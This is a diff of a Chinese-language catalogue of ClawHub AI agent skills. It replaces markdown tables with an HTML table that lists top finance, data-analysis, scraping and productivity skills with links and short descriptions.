-| Tweet Writer | [Clawdbot/tweet-writer](https://clawdhub.com/skills/tweet-writer) | 撰写病毒式、有说服力、引人入胜的推文和话题。使用网络研究在您的利基市场中找到病毒式传播的示例，然后根据经过验证的公式和 X 算法优化对写作进行建模。在创建推文、话题或 X 内容策略时使用。 |
-| Vercel Deploy Claimable | [Clawdbot/vercel-deploy-claimable](https://clawdhub.com/skills/vercel-deploy-claimable) | 将应用程序和网站部署到 Vercel。当用户请求部署操作（例如“部署我的应用程序”、“将其部署到生产环境”、“创建预览部署”、“部署并给我链接”或“推送此活动”）时，请使用此技能。无需身份验证 - 返回预览 URL 和可声明的部署链接。 |
-| Vikunja | [Clawdbot/vikunja](https://clawdhub.com/skills/vikunja) | 在开源项目管理工具 Vikunja 中管理项目和任务。创建项目、任务、设置截止日期、优先级并跟踪完成情况。 |
-| Vikunja Fast | [Clawdbot/vikunja-fast](https://clawdhub.com/skills/vikunja-fast) | 管理 Vikunja 项目和任务（过期/到期/今天）、标记完成并通过 Vikunja API 获取快速摘要。 |
-| Vikunja 任务管理 | [Clawdbot/vikunja-tasks](https://clawdhub.com/skills/vikunja-tasks) | 在自托管 Vikunja 实例上管理任务和项目。当用户想要创建、查看、完成或管理任务、检查到期或逾期的任务、列出项目或获取任务通知时使用。还可用于待办事项列表、提醒和任务跟踪。 |
-| Core Web Vitals Fixer | [Clawdbot/vitals-fixer](https://clawdhub.com/skills/vitals-fixer) | 通过 AI 指导解决核心 Web Vitals 问题。当您的 Lighthouse 分数需要提高时使用。 |
-| Weathercli | [Clawdbot/weathercli](https://clawdhub.com/skills/weathercli) | 获取全球任何地点的当前天气状况和预报。返回温度、湿度、风、降水量等结构化数据。无需 API 密钥。 |
-| Webhook 生成器 | [Clawdbot/webhook-gen](https://clawdhub.com/skills/webhook-gen) | 使用 AI 生成具有重试逻辑的 Webhook 处理程序。在集成 Stripe、GitHub 或任何 Webhook 提供商时使用。 |
-| WeCom | [Clawdbot/wecom](https://clawdhub.com/skills/wecom) | 使用MCP协议通过webhooks向WeCom (企业微信)发送消息。与Claude Code、Claude Desktop和其他MCP客户合作。 |
-| Weekly Synthesis | [Clawdbot/weekly-synthesis](https://clawdhub.com/skills/weekly-synthesis) | 创建本周工作和思考的综合综合 |
-| Workout Logger | [Clawdbot/workout-logger](https://clawdhub.com/skills/workout-logger) | 记录锻炼、跟踪进度、获取锻炼建议和 PR 跟踪 |
-| Wyoming Clawdbot | [Clawdbot/wyoming-clawdbot](https://clawdhub.com/skills/wyoming-clawdbot) | 用于 Home Assistant 语音助手与 Clawdbot 集成的怀俄明协议桥接器。 |
-| X Algorithm | [Clawdbot/x-algorithm](https://clawdhub.com/skills/x-algorithm) | X (Twitter) 算法规则、病毒策略和文章最佳实践。提高参与度，避免死亡，撰写真正有效的帖子。 |
-| X API | [Clawdbot/x-api](https://clawdhub.com/skills/x-api) | 使用 OAuth 1.0a 的官方 API 发布到 X (Twitter)。当您需要发推文、发布更新或发布内容时使用。绕过影响基于 cookie 的方法（如 Bird CLI）的速率限制和机器人检测。 |
-| X Algorithm Mastery | [Clawdbot/x-mastery](https://clawdhub.com/skills/x-mastery) | 完全掌握 X (Twitter) 算法 - 参与度权重、病毒公式、避免影子禁令、线程优化和增长策略。基于X的开源代码分析和真实创作者数据。 |
-| Yahoo Finance | [Clawdbot/yahoo-finance](https://clawdhub.com/skills/yahoo-finance) | 使用雅虎财经获取股票价格、报价、基本面、收益、期权、股息和分析师评级。使用 yfinance 库 - 无需 API 密钥。 |
+> 该分类共 **3,907** 个技能，以下按下载量倒序展示 Top 200。
 
-### 🚀 部署与CI/CD
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Anxiety Relief | [Clawdbot/anxiety-relief](https://clawdhub.com/skills/anxiety-relief) | 通过基础练习、呼吸技巧和思维重构来控制焦虑 |
-| BBC News | [Clawdbot/bbc-news](https://clawdhub.com/skills/bbc-news) | 通过 RSS 源获取并显示来自各个部分和地区的 BBC 新闻报道。当用户请求 BBC 新闻、英国新闻头条、BBC 世界新闻或特定 BBC 栏目（技术、商业、政治、科学、健康、娱乐、英国地方新闻或世界地区）的新闻时使用。 |
-| Build Discipline | [Clawdbot/build-discipline](https://clawdhub.com/skills/build-discipline) | 通过习惯积累、连续跟踪和问责制建立牢不可破的纪律 |
-| ChatGPT Apps | [Clawdbot/chatgpt-apps](https://clawdhub.com/skills/chatgpt-apps) | 完整的 ChatGPT 应用程序构建器 - 使用 MCP 服务器、小部件、身份验证、数据库集成和自动部署创建、设计、实施、测试和部署 ChatGPT 应用程序 |
-| ClawdBites | [Clawdbot/clawdbites](https://clawdhub.com/skills/clawdbites) | 从 Instagram 卷轴中提取食谱。当用户发送 Instagram 卷轴链接并希望从标题中获取食谱时使用。将成分、说明和宏解析为干净的格式。 |
-| Coolify | [Clawdbot/coolify](https://clawdhub.com/skills/coolify) | 通过 Coolify API 管理 Coolify 部署、应用程序、数据库和服务。当用户想要部署、启动、停止、重新启动或管理 Coolify 上托管的应用程序时使用。 |
-| 依赖项检查器 | [Clawdbot/deps-checker](https://clawdhub.com/skills/deps-checker) | 查找未使用和过时的依赖项。当你的 package.json 混乱时使用。 |
-| D&D 5e 工具包 | [Clawdbot/dnd](https://clawdhub.com/skills/dnd) | 适用于玩家和 DM 的 D&D 5e 工具包。掷骰子、查找咒语和怪物、生成角色、创造遭遇并生成 NPC。使用官方 D&D 5e SRD API。 |
-| ElevenLabs Agents | [Clawdbot/elevenlabs-agents](https://clawdhub.com/skills/elevenlabs-agents) | 创建、管理和部署 ElevenLabs 对话式 AI 代理。当用户想要使用语音代理、列出其代理、创建新代理或管理代理配置时使用。 |
-| GEO Optimization | [Clawdbot/geo-optimization](https://clawdhub.com/skills/geo-optimization) | 用于 AI 搜索可见性的生成引擎优化 (GEO)。优化内容以显示在 ChatGPT、Perplexity、Claude 和 Google AI 概述中。在优化网站、页面或内容以提高 LLM 的可发现性和引用时使用。 |
-| GEO Optimizer | [Clawdbot/geo-optimizer](https://clawdhub.com/skills/geo-optimizer) | 优化 AI 引文 (GEO) 的内容。当用户说“GEO”、“生成引擎优化”、“AI 引用”、“被 AI 引用”、“AI 友好内容”或为 ChatGPT/Claude/Perplexity 可见性创建内容时使用。 |
-| Grok Search | [Clawdbot/grok-search](https://clawdhub.com/skills/grok-search) | 通过 xAI Responses API 使用 xAI Grok 服务器端工具（web_search、x_search）搜索网络或 X/Twitter。当您需要来自 X 的推文/线程/用户，希望 Grok 作为 Brave 的替代品，或者您需要结构化 JSON + 引用时，请使用。 |
-| Idealista CLI | [Clawdbot/idealista-cli](https://clawdhub.com/skills/idealista-cli) | 使用 Idealista CLI 按位置（城市、城镇、地区、街道）搜索 Idealista 列表并获取列表详细信息。当用户请求 Idealista 市场数据或需要 Idealista-cli 的 CLI 命令/标志时应用。 |
-| Journal to Post | [Clawdbot/journal-to-post](https://clawdhub.com/skills/journal-to-post) | 将个人日记条目转换为可共享的社交媒体帖子 |
-| K8s 多集群 | [Clawdbot/k8-multicluster](https://clawdhub.com/skills/k8-multicluster) | 管理多个 Kubernetes 集群、切换上下文以及执行跨集群操作。在使用多个集群、比较环境或管理集群生命周期时使用。 |
-| K8s 证书 | [Clawdbot/k8s-certs](https://clawdhub.com/skills/k8s-certs) | 使用 cert-manager 进行 Kubernetes 证书管理。在管理 TLS 证书、配置颁发者或解决证书问题时使用。 |
-| Late API | [Clawdbot/late-api](https://clawdhub.com/skills/late-api) | 用于在 13 个社交媒体平台上安排帖子的官方 Late API 参考。涵盖身份验证、端点、Webhook 和特定于平台的功能。使用 Late Social Media Scheduling API 进行构建时使用。 |
-| OnChat | [Clawdbot/onchat](https://clawdhub.com/skills/onchat) | 通过 Base L2 上的 OnChat 读取和发送链上消息。浏览频道、阅读对话并通过以区块链交易的形式发送消息来参与。 |
-| Parallel.ai Search | [Clawdbot/parallel](https://clawdhub.com/skills/parallel) | 通过 Parallel.ai API 进行高精度网络搜索和研究。针对具有丰富摘录和引文的 AI 代理进行了优化。 |
-| Parallel.ai Search | [Clawdbot/parallel-1-0-1](https://clawdhub.com/skills/parallel-1-0-1) | 通过 Parallel.ai API 进行高精度网络搜索和研究。针对具有丰富摘录和引文的 AI 代理进行了优化。 |
-| The Playground | [Clawdbot/playground](https://clawdhub.com/skills/playground) | 连接到 The Playground——一个虚拟的社交空间，人工智能代理可以在这里见面、聊天和一起探索。当用户希望他们的机器人与其他机器人进行社交、访问 Playground、探索虚拟房间或在共享空间中与其他 AI 代理聊天时使用。 |
-| Search X | [Clawdbot/search-x](https://clawdhub.com/skills/search-x) | 使用 Grok 实时搜索 X/Twitter。查找带有引文的推文、趋势和讨论。 |
-| Social Card 生成器 | [Clawdbot/social-card-gen](https://clawdhub.com/skills/social-card-gen) | 为不同平台生成社交媒体帖子。共享内容时使用。 |
-| Social Generator | [Clawdbot/social-gen](https://clawdhub.com/skills/social-gen) | 为不同平台生成社交媒体帖子。共享内容时使用。 |
-| Surfline | [Clawdbot/surfline](https://clawdhub.com/skills/surfline) | 从 Surfline 公共端点获取冲浪预报和当前状况（无需登录）。用于查找 Surfline 地点 ID、获取特定地点的预测/条件以及总结多个喜爱的地点。 |
-| Tavily Web Search | [Clawdbot/tavily-search](https://clawdhub.com/skills/tavily-search) | 通过 Tavily API 进行人工智能优化的网络搜索。为 AI 代理返回简洁、相关的结果。 |
-| Testosterone Optimization | [Clawdbot/testosterone-optimization](https://clawdhub.com/skills/testosterone-optimization) | 通过睡眠、锻炼、营养和生活方式跟踪优化天然睾酮 |
-| Trein | [Clawdbot/trein](https://clawdhub.com/skills/trein) | 通过 trein CLI 查询荷兰铁路 (NS) 的火车出发情况、行程计划、中断情况和车站搜索。 |
-| Vercel Config 生成器 | [Clawdbot/vercel-config-gen](https://clawdhub.com/skills/vercel-config-gen) | 生成优化的 Vercel 配置。部署到 Vercel 时使用。 |
-| Web Deploy | [Clawdbot/web-deploy](https://clawdhub.com/skills/web-deploy) | （无） |
-| WHO Growth Charts | [Clawdbot/who-growth-charts](https://clawdhub.com/skills/who-growth-charts) | 生成带有百分位数曲线的 WHO 儿童生长图表（身高、体重、BMI）。根据需要下载世界卫生组织官方参考数据。当用户询问儿童生长跟踪、百分位数或想要孩子的生长图表时使用。 |
-| WHO Growth Charts | [Clawdbot/who-growth-charts-skill](https://clawdhub.com/skills/who-growth-charts-skill) | 生成带有百分位数曲线的 WHO 儿童生长图表（身高、体重、BMI）。根据需要下载世界卫生组织官方参考数据。当用户询问儿童生长跟踪、百分位数或想要孩子的生长图表时使用。 |
+<table>
+<colgroup>
+<col width="4%">
+<col width="8%">
+<col width="14%">
+<col width="14%">
+<col width="60%">
+</colgroup>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>中文技能名称</th>
+<th>技能名称</th>
+<th>链接</th>
+<th>核心功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td>技能发现</td>
+<td>Find Skills</td>
+<td><a href="https://clawdhub.com/skills/find-skills">ClawHub/find-skills</a></td>
+<td>当用户询问&quot;如何做某事&quot;、&quot;寻找某技能&quot;或希望扩展功能时，帮助发现并安装智能体技能。适用于寻找可安装功能的场景。</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>Polymarket 预测市场</td>
+<td>Polymarket</td>
+<td><a href="https://clawdhub.com/skills/polymarket-trade">ClawHub/polymarket-trade</a></td>
+<td>查询 Polymarket 预测市场，查看赔率、发现热门市场、搜索事件、追踪价格波动。</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>Excel 表格处理</td>
+<td>Excel / XLSX</td>
+<td><a href="https://clawdhub.com/skills/excel-xlsx">ClawHub/excel-xlsx</a></td>
+<td>创建、检查和编辑 Microsoft Excel 工作簿及 XLSX 文件，支持可靠的公式、日期、类型、格式、重算及模板保留功能。</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>数据分析</td>
+<td>Data Analysis</td>
+<td><a href="https://clawdhub.com/skills/data-analysis">ClawHub/data-analysis</a></td>
+<td>{&quot;answer&quot;:&quot;数据分析与可视化。查询数据库、生成报告、自动化电子表格，将原始数据转化为清晰可行的见解。适用于：(1) 您……&quot;}</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td>股票分析</td>
+<td>Stock Analysis</td>
+<td><a href="https://clawdhub.com/skills/stock-analysis">ClawHub/stock-analysis</a></td>
+<td>{&quot;answer&quot;:&quot;基于雅虎财经数据，分析股票与加密货币。支持投资组合管理、自选股预警、股息分析、8维评分、热门趋势扫描及传闻/早期信号探测。适用于股票分析、持仓追踪、财报异动、加密监控、热门股追踪或提前发掘非主流传闻。&quot;}</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td>tushare金融</td>
+<td>tushare-finance 🔑</td>
+<td><a href="https://clawdhub.com/skills/tushare-finance">ClawHub/tushare-finance</a></td>
+<td>获取中国金融市场数据（A股、港股、美股、基金、期货、债券）。支持220+个Tushare Pro接口：股票行情、财务报表、宏观经济指标。当用户请求股价数据、财务分析、指数行情、GDP/CPI等宏观数据时使用。</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td>股量化</td>
+<td>A股量化 AkShare</td>
+<td><a href="https://clawdhub.com/skills/akshare-stock">ClawHub/akshare-stock</a></td>
+<td>A股量化数据分析工具，基于AkShare库获取A股行情、财务数据、板块信息等。用于回答关于A股股票查询、行情数据、财务分析、选股等问题。</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td>markdown转换器</td>
+<td>Markdown Converter</td>
+<td><a href="https://clawdhub.com/skills/markdown-converter">ClawHub/markdown-converter</a></td>
+<td>{&quot;answer&quot;:&quot;使用 markitdown 将文档和文件转换为 Markdown。用于将 PDF、Word (.docx)、PowerPoint (.pptx)、Excel (.xlsx, .xls)、HTML、CSV、JSON、XML、图片（含 EXIF/OCR）、音频（含转录）、ZIP 压缩包、YouTube 链接或 EPub 转换为 Markdown 格式，以进行 LLM 处理或...</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td>股票watcher</td>
+<td>Stock Watcher</td>
+<td><a href="https://clawdhub.com/skills/stock-watcher">ClawHub/stock-watcher</a></td>
+<td>管理和监控个人股票自选列表，支持利用同花顺数据添加、删除、列出股票及汇总近期表现。适用于用户希望追踪特定股票、获取表现汇总或管理自选列表时。</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td>session日志</td>
+<td>Session-logs</td>
+<td><a href="https://clawdhub.com/skills/session-logs">ClawHub/session-logs</a></td>
+<td>使用 jq 搜索并分析自身的会话日志（旧会话/父对话）。</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td>数据analyst</td>
+<td>Data Analyst</td>
+<td><a href="https://clawdhub.com/skills/data-analyst">ClawHub/data-analyst</a></td>
+<td>数据可视化、报告生成、SQL查询和电子表格自动化。将您的AI代理转变为数据分析师，将原始数据转化为可操作的洞察。</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td>股票市场专业版</td>
+<td>Stock Market Pro</td>
+<td><a href="https://clawdhub.com/skills/stock-market-pro">ClawHub/stock-market-pro</a></td>
+<td>Yahoo Finance (yfinance) 驱动的股票分析技能：行情报价、基本面、ASCII 趋势图、高分辨率图表（RSI/MACD/BB/VWAP/ATR），以及可选的网络...</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td>mx金融数据</td>
+<td>All-Market Financial Data Hub 🔑</td>
+<td><a href="https://clawdhub.com/skills/mx-finance-data">ClawHub/mx-finance-data</a></td>
+<td>基于东方财富数据库，支持自然语言查询金融数据，覆盖A股、港股、美股、基金、债券等资产类型，提供实时行情、公司信息、估值、财务报表等数据，适用于投资研究、交易复盘、市场监控、行业分析、信用研究、财报审计、资产配置等场景，满足机构与个人用户需求，输出结果含数据说明及Excel文件。</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td>股票监控技能</td>
+<td>Stock Monitor</td>
+<td><a href="https://clawdhub.com/skills/stock-monitor-skill">ClawHub/stock-monitor-skill</a></td>
+<td>全功能智能股票监控预警系统。支持成本百分比、均线金叉死叉、RSI超买超卖、成交量异动、跳空缺口、动态止盈等7大预警规则。符合中国投资者习惯（红涨绿跌）。</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td>股分时量能分析</td>
+<td>A股分时量能分析</td>
+<td><a href="https://clawdhub.com/skills/a-stock-analysis">ClawHub/a-stock-analysis</a></td>
+<td>提供A股实时行情、分时成交量分布及主力资金动向分析，支持持仓管理和盈亏监控。</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td>PDFTextExtractor</td>
+<td>PDF Text Extractor</td>
+<td><a href="https://clawdhub.com/skills/pdf-text-extractor">ClawHub/pdf-text-extractor</a></td>
+<td>从PDF提取文本，支持OCR。适合文档数字化、发票处理、内容分析。无需任何依赖。</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td>中国股票分析</td>
+<td>China Stock Analysis</td>
+<td><a href="https://clawdhub.com/skills/china-stock-analysis">ClawHub/china-stock-analysis</a></td>
+<td>分析A股和港股股价，提供投资建议，用于用户询问中国公司股票分析时。</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td>Bilibili All In One</td>
+<td>Bilibili All In One 🔑</td>
+<td><a href="https://clawdhub.com/skills/bilibili-all-in-one">ClawHub/bilibili-all-in-one</a></td>
+<td>全面的B站工具箱，集成热门趋势监控、视频下载、观看/播放、字幕下载和视频发布功能。</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td>市场研究</td>
+<td>Market Research</td>
+<td><a href="https://clawdhub.com/skills/market-research">ClawHub/market-research</a></td>
+<td>开展市场研究，涵盖规模估算、细分、竞品图谱、价格核查及需求验证，将模糊构想转化为决策依据。</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td>academic深度研究</td>
+<td>Academic Deep Research</td>
+<td><a href="https://clawdhub.com/skills/academic-deep-research">ClawHub/academic-deep-research</a></td>
+<td>透明严谨、方法全公开的非黑盒研究。通过强制每主题双轮调研、APA 7版引用、证据分级及3次用户确认进行详尽调查。基于原生OpenClaw工具（web_search、web_fetch、sessions_spawn）独立运行。适用于文献综述、竞品分析及任何需学术严谨与可复现性的研究。</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td>firecrawl搜索</td>
+<td>Firecrawl Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/firecrawl-search">ClawHub/firecrawl-search</a></td>
+<td>通过 Firecrawl API 进行网页搜索与抓取。适用于搜索网络、抓取网站（包括重度JS页面）、爬取全站或从网页提取结构化数据。需要配置 FIRECRAWL_API_KEY 环境变量。</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td>代码分析技能</td>
+<td>Code Analysis Skills</td>
+<td><a href="https://clawdhub.com/skills/code-analysis-skills">ClawHub/code-analysis-skills</a></td>
+<td>此技能适用于需要分析Git仓库、比较开发者提交模式、工作习惯、开发效率、代码风格等场景。</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td>CLI</td>
+<td>Cli</td>
+<td><a href="https://clawdhub.com/skills/cli">ClawHub/cli</a></td>
+<td>提供CLI命令以列出、检查及验证moltbot技能及其要求的资格。</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td>Who Is Actor</td>
+<td>Who Is Actor</td>
+<td><a href="https://clawdhub.com/skills/who-is-actor">ClawHub/who-is-actor</a></td>
+<td>当用户想要分析 Git 仓库并剖析每位开发者的提交习惯、工作习惯、开发效率等指标时，应使用此技能。</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td>us股票分析</td>
+<td>Us Stock Analysis</td>
+<td><a href="https://clawdhub.com/skills/us-stock-analysis">ClawHub/us-stock-analysis</a></td>
+<td>{&quot;answer&quot;:&quot;全方位美股分析，涵盖基本面（财务指标、商业品质、估值）、技术面（指标、图表形态、支撑阻力）、股票对比及投资报告生成。适用于用户请求分析美股代码（如“分析AAPL”、“对比TSLA与NVDA”、“出具微软报告”）、评估财务指标、技术图表分析或提供美股投资建议。&quot;}</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td>yahoo金融</td>
+<td>Yahoo Finance</td>
+<td><a href="https://clawdhub.com/skills/yahoo-finance">ClawHub/yahoo-finance</a></td>
+<td>使用 yfinance 库，无需 API 密钥，获取 Yahoo Finance 的股票价格、行情、基本面、盈利、期权、分红及分析师评级。</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td>Eno技能</td>
+<td>Eno Skills</td>
+<td><a href="https://clawdhub.com/skills/eno">ClawHub/eno</a></td>
+<td>该技能用于在用户需要分析前端项目架构、评估技术栈选择、审查组件设计模式、评估构建（或性能）等场景。</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td>代理reach</td>
+<td>Agent Reach</td>
+<td><a href="https://clawdhub.com/skills/agent-reach">ClawHub/agent-reach</a></td>
+<td>让你的AI代理拥有看见整个互联网的眼睛。7500+ GitHub星。搜索并阅读14个平台：Twitter/X、Reddit、YouTube、GitHub、Bilibili、小红书…</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td>金融</td>
+<td>finance 🔑</td>
+<td><a href="https://clawdhub.com/skills/finance">ClawHub/finance</a></td>
+<td>追踪股票、ETF、指数、加密货币及外汇对，支持缓存与提供商故障转移。</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td>股票infoexplorer</td>
+<td>Stock Info Explorer</td>
+<td><a href="https://clawdhub.com/skills/stock-info-explorer">ClawHub/stock-info-explorer</a></td>
+<td>{&quot;answer&quot;:&quot;基于 Yahoo Finance (yfinance) 的金融分析工具。获取实时报价，生成含均线及指标（RSI/MACD/布林带/VWAP/ATR）的高清图表，汇总基本面，一键生成文本摘要与专业图表报告。&quot;}</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td>市场分析服务</td>
+<td>Market Analysis CN \| 市场分析服务</td>
+<td><a href="https://clawdhub.com/skills/market-analysis-cn">ClawHub/market-analysis-cn</a></td>
+<td>市场分析服务 | Market Analysis Service. 企业市场趋势分析 | Enterprise market trend analysis. 竞品分析 | Competitor analysis. 用户行为洞察 | User behavior insights. 触发词：市场分析、竞品分析、mar...</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td>谷歌sheets</td>
+<td>Google Sheets 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-sheets">ClawHub/google-sheets</a></td>
+<td>通过托管OAuth集成Google Sheets API，实现电子表格数据的读取与写入、工作表的创建、格式应用以及范围管理。适用于需要此类操作的场景。</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td>tushare数据</td>
+<td>tushare 🔑</td>
+<td><a href="https://clawdhub.com/skills/tushare-data">ClawHub/tushare-data</a></td>
+<td>面向中文自然语言的 Tushare 数据研究技能。将“查看股票走势”“分析财报趋势”“查询板块动态”“追踪北向资金”“导出行情数据”等请求，转换为数据获取、清洗、对比、筛选、导出与简要分析流程。支持 A 股、指数、ETF/基金、财务、估值、资金流、公告新闻、板块概念与宏观等场景。</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td>mxmacro数据</td>
+<td>Global Macro Database Assistant 🔑</td>
+<td><a href="https://clawdhub.com/skills/mx-macro-data">ClawHub/mx-macro-data</a></td>
+<td>基于东方财富数据库，支持自然语言查询全球宏观经济数据，覆盖国民经济核算、价格指数、货币金融、财政收支、对外贸易、就业民生、产业运行等领域，适用于宏观经济研究、市场分析与政策解读等场景，返回结果包括数据说明及 CSV 文件。</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td>Polymarket 赔率查询</td>
+<td>Polymarket Odds</td>
+<td><a href="https://clawdhub.com/skills/polymarket-odds">ClawHub/polymarket-odds</a></td>
+<td>通过CLI查询Polymarket预测市场赔率和事件。搜索市场、获取当前价格、按类别列出事件。支持体育博彩（NFL、NBA、足球/英超、欧冠）、政治、加密货币、选举、地缘政治。真实货币市场比民调更准确。无需API密钥。在被问及赔率、概率、预测或&quot;X的可能性有多大&quot;时使用。</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td>OpenClaw查找技能</td>
+<td>Find Skills</td>
+<td><a href="https://clawdhub.com/skills/openclaw-find-skills">ClawHub/openclaw-find-skills</a></td>
+<td>{&quot;answer&quot;:&quot;从开放智能体技能生态中搜索、发现并安装技能，以拓展特定任务或领域的能力。&quot;}</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td>Technical Analyst</td>
+<td>Technical Analyst</td>
+<td><a href="https://clawdhub.com/skills/technical-analyst">ClawHub/technical-analyst</a></td>
+<td>该技能用于分析股票、股指、加密货币或外汇对的周线图。当用户提供图表图像并要求进行技术分析、趋势识别、支撑/阻力位判断、情境推演或概率评估时，应使用此技能。分析仅基于图表数据，不考虑新闻或基本面因素。</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td>Tushare专业版</td>
+<td>Tushare Pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/tushare">ClawHub/tushare</a></td>
+<td>通过Tushare API获取中国股票和期货市场数据，支持股票行情、期货数据、公司基本面及宏观经济指标。适用于...</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td>加密市场数据</td>
+<td>Crypto Market Data Skill (No Key Required)</td>
+<td><a href="https://clawdhub.com/skills/crypto-market-data">ClawHub/crypto-market-data</a></td>
+<td>免费层无需 API Key。专业级加密货币与股市数据集成，支持实时行情、公司概况及全球分析。基于 Node.js，零外部依赖。</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td>图图像</td>
+<td>Chart Image</td>
+<td><a href="https://clawdhub.com/skills/chart-image">ClawHub/chart-image</a></td>
+<td>从数据生成专业级图表图片。支持折线图、柱状图、面积图、散点图、直方图、蜡烛图、饼图/环形图、热力图、多系列及堆叠图等。</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td>timeseries分析</td>
+<td>time-sereis-analysis</td>
+<td><a href="https://clawdhub.com/skills/time-series-analysis">ClawHub/time-series-analysis</a></td>
+<td>全面的时间序列数据科学技能，涵盖特征工程、模型训练与竞赛获胜策略。</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td>Xurl</td>
+<td>Xurl</td>
+<td><a href="https://clawdhub.com/skills/xurl">ClawHub/xurl</a></td>
+<td>分析Twitter内容挖掘WordPress和Shopify客户痛点，打造权威帖文并生成合格入站线索洞察。</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td>sleek设计移动apps</td>
+<td>Desing mobile apps 🔑</td>
+<td><a href="https://clawdhub.com/skills/sleek-design-mobile-apps">ClawHub/sleek-design-mobile-apps</a></td>
+<td>用于用户想要设计移动应用、创建界面、构建UI或与其Sleek项目进行交互的场景。涵盖高级需求（如“设计一个应用...”等）。</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td>capabilityevolver专业版</td>
+<td>Capability Evolver</td>
+<td><a href="https://clawdhub.com/skills/capability-evolver-pro">ClawHub/capability-evolver-pro</a></td>
+<td>用于AI智能体自我改进的元技能。分析运行日志以检测错误模式、回归和低效问题，随后生成结构化改进方案。</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td>微信mpcn</td>
+<td>WeChat MP CN 🔑</td>
+<td><a href="https://clawdhub.com/skills/wechat-mp-cn">ClawHub/wechat-mp-cn</a></td>
+<td>微信公众号监控 - 文章监控、阅读量追踪、舆情分析（WeChat Official Account）</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td>paddleocr文档parsing</td>
+<td>PaddleOCR Document Parsing 🔑</td>
+<td><a href="https://clawdhub.com/skills/paddleocr-doc-parsing">ClawHub/paddleocr-doc-parsing</a></td>
+<td>从 PDF 和文档图像中提取结构化 Markdown/JSON，支持单元格级精度表格、LaTeX 公式、图片、印章、图表等。</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td>EcomSeer</td>
+<td>EcomSeer 🔑</td>
+<td><a href="https://clawdhub.com/skills/ecomseer">ClawHub/ecomseer</a></td>
+<td>TikTok Shop电商数据助手。支持搜索商品、挖掘爆品、分析达人、探索店铺、追踪视频表现及获取广告洞察。</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td>cctv新闻fetcher</td>
+<td>CCTV News Fetcher</td>
+<td><a href="https://clawdhub.com/skills/cctv-news-fetcher">ClawHub/cctv-news-fetcher</a></td>
+<td>获取并解析指定日期的中央电视台新闻联播的新闻摘要。</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td>股票监控</td>
+<td>Stock Monitor</td>
+<td><a href="https://clawdhub.com/skills/stock-monitor">ClawHub/stock-monitor</a></td>
+<td>股票价格实时监控。支持多只股票监控，使用 Yahoo Finance API 获取实时股价，自定义涨跌阈值提醒。当股价波动超过设定阈值时自动发送提醒，支持首次预警和续警机制。用于：(1) 监控持仓股票价格波动 (2) 设置价格提醒 (3) 定期检查股价变化</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td>市场environment分析</td>
+<td>Market Environment Analysis</td>
+<td><a href="https://clawdhub.com/skills/market-environment-analysis">ClawHub/market-environment-analysis</a></td>
+<td>Comprehensive market environment analysis and reporting tool. Analyzes global markets including US, European, Asian markets, forex, commodities, and economic indicators. Provides risk-on/risk-off a...</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td>股票预测系统</td>
+<td>股票预测系统</td>
+<td><a href="https://clawdhub.com/skills/stock-predictor">ClawHub/stock-predictor</a></td>
+<td>基于多因子分析，每小时自动预测沪深股票走势，支持参数自优化，目标准确率达90%以上。</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td>firecrawl技能</td>
+<td>Firecrawl Skills 🔑</td>
+<td><a href="https://clawdhub.com/skills/firecrawl-skills">ClawHub/firecrawl-skills</a></td>
+<td>Firecrawl CLI用于网页抓取、爬取和搜索。支持抓取单页或整站，映射URL并搜索网络，全内容提取。返回干净Markdown，适配LLM。适用于研究、文档提取、竞争情报和内容监控。</td>
+</tr>
+<tr>
